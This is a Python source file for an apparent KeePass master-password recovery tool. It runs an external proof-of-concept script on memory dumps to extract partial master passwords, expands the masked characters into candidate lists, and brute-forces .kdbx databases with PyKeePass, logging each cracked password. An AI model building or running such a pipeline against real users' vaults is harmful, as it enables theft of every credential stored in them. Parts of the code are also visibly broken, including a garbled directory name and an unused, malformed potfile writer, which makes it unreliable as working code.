import os
import re
import subprocess
from typing import Dict, List, Tuple, Union

from pykeepass import PyKeePass
from logger import log_msg
import exrex


def get_or_create_folders() -> Tuple[str, ...]:
    """
    Ensures the existence of specific directories and returns their paths.

    This function retrieves the current working directory and defines paths for several directories.
    If any of the specified directories do not exist, they are created automatically.
    If required library directories do not exist, an exception is raised.

    Raises:
        FileNotFoundError: If a required directory (e.g., keepass-dump-masterkey) is not found.

    Returns:
        tuple[str, ...]: A tuple containing the paths to the directories.
    """
    log_msg("Getting the list of necessary directories locations...")
    # Get the current working directory (where the main script is executed from)
    main_script_dir = os.getcwd()
    # Define the paths to the libraries and resources directories.
    possible_pwds_dir = os.path.join(main_script_dir, "possible-pwds")
    generated_pwds_dir = os.path.join(main_script_dir, "generated-pwds")
    keepass_dump_masterkey_dir = os.path.join(main_script_dir, "keepakeepass-dump-masterkeyss")

    if not os.path.exists(keepass_dump_masterkey_dir):
        log_msg(f"Please make sure keepass-dump-masterkey is installed in {keepass_dump_masterkey_dir}", "WARNING")
        raise FileNotFoundError(f"Required directory not found: {keepass_dump_masterkey_dir}")

    # Check if the directory exists, if not, create it
    if not os.path.exists(possible_pwds_dir):
        os.makedirs(possible_pwds_dir)
    if not os.path.exists(generated_pwds_dir):
        os.makedirs(generated_pwds_dir)

    return possible_pwds_dir, generated_pwds_dir, keepass_dump_masterkey_dir


def collect_dumps(dir: str) -> Tuple[List[str], List[str]]:
    """
    Collects and returns lists of specific file types from a directory.

    This function scans the specified directory and identifies files with specific extensions:
    - Files ending with ".DMP" are added to the dump_files list.
    - Files ending with ".kdbx" are added to the keepass_files list.

    If the directory contains non-file entries (e.g., subdirectories), they are skipped.

    Args:
        dir (str): The directory to scan for files.

    Returns:
        Tuple[List[str], List[str]]: A tuple containing:
            - dump_files: A list of file paths for files ending with ".DMP".
            - keepass_files: A list of file paths for files ending with ".kdbx".

    """
    log_msg(f"Collecting .DMP and .kdbx files from {dir}...")
    dir_list: List[str] = os.listdir(dir)  # We can safely assume str is the return type
    dump_files = []
    keepass_files = []

    for f in dir_list:
        file_path = os.path.join(dir, f)

        # Skip non-file entries like directories
        if not os.path.isfile(file_path):
            continue

        # Add .DMP files to dump_files list
        if f.lower().endswith(".dmp"):
            dump_files.append(file_path)

        # Add .kdbx files to keepass_files list
        if f.lower().endswith(".kdbx"):
            keepass_files.append(file_path)
    log_msg(f"Collected {len(dump_files)} .DMP files.")
    log_msg(f"Collected {len(keepass_files)} .kdbx files.")
    return dump_files, keepass_files


def collect_possible_pwds(dump_files: List[str], keepass_dumper_dir: str, possible_pwds_dir: str) -> List[str]:
    """
    Processes a list of dump files to extract possible passwords and saves them in text files.

    For each file in the provided list of dump files, this function:
    - Checks if the corresponding possible password file already exists in the target directory.
    - If it exists, the file is added to the list of possible password files.
    - If it does not exist, the function runs a subprocess to extract passwords and creates a new password file.

    Args:
        dump_files (list[str]): A list of dump file paths to process.
        keepass_dumper_dir (str): The directory where the password extraction tool is located.
        possible_pwds_dir (str): The directory where possible password files should be saved.

    Returns:
        list[str]: A list of paths to the possible password files.

    """
    log_msg("Collecting possible passwords from .DMP files...")
    possible_pwds_files = []

    for f in dump_files:

        # Get the base file name without extension from an absolute or relative path
        file_name_without_ext = os.path.splitext(os.path.basename(f))[0]
        possible_pwd_file = os.path.join(possible_pwds_dir, f"{file_name_without_ext}.txt")

        if os.path.isfile(possible_pwd_file):
            log_msg(f"Passwords file already exists for {f}: {possible_pwd_file}. Skipping...", "DEBUG")
            possible_pwds_files.append(possible_pwd_file)
            continue

        log_msg(f"Getting possible passwords from {f} file...")

        run_subprocess(
            ["python", "poc.py", f"{f}", "-o", f"{possible_pwd_file}"],
            cwd=keepass_dumper_dir,
            encoding="utf-8",
            check=True,
        )

        log_msg(f"Possible passwords saved in {possible_pwd_file} file...")
        possible_pwds_files.append(possible_pwd_file)

    return possible_pwds_files


def generate_pwds(possible_pwds_files: List[str], generated_pwds_dir: str) -> List[str]:
    """
    Generates password permutations from a list of possible passwords and saves them to text files.

    This function reads possible password files, generates permutations for each password using regex patterns,
    and writes the generated passwords to new files in the specified directory. If the generated file already exists,
    the function skips generating it again.

    Args:
        possible_pwds_files (list[str]): A list of file paths containing possible passwords.
        generated_pwds_dir (str): The directory where generated password files will be saved.

    Returns:
        list[str]: A list of file paths for the generated password files.
    """
    log_msg("Generating passwords...")
    generated_pwd_files = []

    for f in possible_pwds_files:
        file_name_without_ext = os.path.splitext(os.path.basename(f))[0]
        generated_pwd_file = os.path.join(generated_pwds_dir, f"{file_name_without_ext}.txt")

        # Skip if the generated password file already exists
        if os.path.isfile(generated_pwd_file):
            log_msg(f"Passwords file already exists for {f}: {generated_pwd_file}. Skipping...", "DEBUG")
            generated_pwd_files.append(generated_pwd_file)
            continue

        with open(f, "r", encoding="utf-8") as file:
            possible_passwords = file.read().splitlines()
        log_msg(f"Read {len(possible_passwords)} possible passwords from {f} file.")

        generated_passwords = []

        for pwd in possible_passwords:
            pwd = re.escape(pwd)
            # Replace specific characters with wildcards (can generalize if needed)
            pwd = pwd.replace("●", ".").replace("", ".")

            # Generate permutations using exrex and collect them
            pwds = list(exrex.generate(pwd))
            generated_passwords.extend(pwds)
        log_msg(f"Generated {len(generated_passwords)} passwords from {f} file.")

        # Write generated passwords to a file, one password per line
        with open(generated_pwd_file, "w", encoding="utf-8") as file:
            file.writelines(f"{password}\n" for password in generated_passwords)
        log_msg(f"Wrote {len(generated_passwords)} passwords to {generated_pwd_file} file.")
        generated_pwd_files.append(generated_pwd_file)

    return generated_pwd_files


def generate_pod_file(exploit_results: List[Dict[str, str]], output_dir: str) -> None:
    pod_file = os.path.join(output_dir, "output.potfile")

    with open(pod_file, "w", encoding="utf-8") as file:
        file.writelines(f"{exploit['result']}" for exploit in exploit_results)
    return pod_file


def brute_force(generated_pwds_files: List[str], keepass_files: List[str]):
    cracks = []
    for f in keepass_files:
        log_msg(f"Exploiting {f}", "DEBUG")
        for pf in generated_pwds_files:
            if any(crack["keepass_file"] == f for crack in cracks):
                break
            if any(crack["possible_pwd_file"] == pf for crack in cracks):
                continue
            log_msg(f"Using pwds file {pf}", "DEBUG")
            with open(pf, "r", encoding="utf-8") as file:
                passwords = file.read().splitlines()
                for pwd in passwords:
                    if any(crack["keepass_file"] == f for crack in cracks):
                        break
                    log_msg(f"Using pwd {pwd}", "DEBUG")

                    try:
                        kp = PyKeePass(f, password=pwd)
                        log_msg(f"Cracked: {pwd}->{kp.database_name}")
                        cracks.append({"keepass_file": f, "pwd": pwd, "possible_pwd_file": pf})
                        break
                    except Exception:
                        continue
    log_msg(f"{cracks}", "DEBUG")


def run_subprocess(
    args: Union[str, bytes, os.PathLike],
    on_error_message: str = None,
    shell: bool = False,
    cwd: str = None,
    encoding: str = None,
    timeout: float = None,
    check: bool = False,  # Adds a check parameter to raise an exception if returncode is non-zero
    input: str = None,  # Adds input parameter to pass data to stdin
) -> subprocess.CompletedProcess[str]:
    """
    Wrapper function that calls subprocess.run with given arguments.

    Args:
        args (tuple) : Arguments to pass to subprocess.run.
        on_error_message (str) : Custom error message to log when subprocess fails.
        shell (bool) : Sets the shell flag of subprocess.run.
        cwd (str): The directory from which to run the command. Defaults to None.
        encoding (str): Specifies encoding for the output.
        timeout (float): Specifies timeout for subprocess.run.
        check (bool): If True, raise a CalledProcessError on non-zero exit code.
        input (str): Data to send to the subprocess' stdin.

    Raises:
        RuntimeError: When subprocess.run returns a non-zero exit code and check is False.
        subprocess.CalledProcessError: If check is True and a non-zero exit code occurs.

    Returns:
        subprocess.CompletedProcess[str] : Result of subprocess.run.
    """

    if shell:
        log_msg(f"Potential security risk: args {args} is running in shell!", "WARNING")

    try:
        # Pass the input argument if specified
        result = subprocess.run(
            args,
            capture_output=True,  # Capture stdout and stderr
            text=True,  # Treat stdout, stderr, and input as text (str)
            shell=shell,  # Run in shell if needed
            cwd=cwd,  # Working directory
            encoding=encoding,  # Encoding for input and output
            timeout=timeout,  # Timeout for the process
            input=input,  # Input data for stdin
            check=check,  # Raise error if command fails (non-zero exit code)
        )
        return result

    except subprocess.TimeoutExpired as e:
        raise RuntimeError(f"Subprocess timed out: {e}")

    except subprocess.CalledProcessError as e:
        if not on_error_message:
            on_error_message = str(args)
        raise RuntimeError(f"{on_error_message}: {e.stderr.strip()}")

    except Exception as e:
        raise RuntimeError(f"An unexpected error occurred: {str(e)}")
